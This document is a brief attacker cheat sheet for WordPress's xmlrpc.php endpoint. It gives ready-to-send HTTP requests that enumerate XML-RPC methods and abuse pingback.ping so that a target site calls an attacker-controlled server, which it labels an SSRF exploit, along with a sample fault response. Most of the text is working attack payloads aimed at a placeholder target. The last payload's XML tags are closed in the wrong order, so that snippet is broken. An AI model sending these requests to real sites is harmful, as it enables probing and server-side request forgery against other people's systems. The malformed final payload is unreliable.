#xmlrpc.php

find endpoint XMLRPC servers on WordPress :
```
POST /xmlrpc.php HTTP/1.1
Host: target.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
XMLRPC PINGBACKS
```
POST /xmlrpc.php HTTP/1.1
Host: target.com
Content-Length: 303

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://YOUR-SERVER</string></value>
</param>
<param>
<value><string>https://TARGET.COM/XMLRPC.PHP</string></value>
</param>
</params>
</methodCall>
```
RESPONSE :
```
HTTP/1.1 200 OK
Date: Fri, 11 Oct 2024 21:53:56 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Connection: close
Vary: Accept-Encoding
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 370
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string></string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

SSRF EXPLOIT
```
<methodCall>
 <methodName>pingback.ping</methodName>
  <params><param>
  <value><string>https://YOUR_SERVER</string></value>
</param><param>
<value><string>https://TARGET/XMLRPC.PHP</value></string>
</param></params>
</methodCall>
```
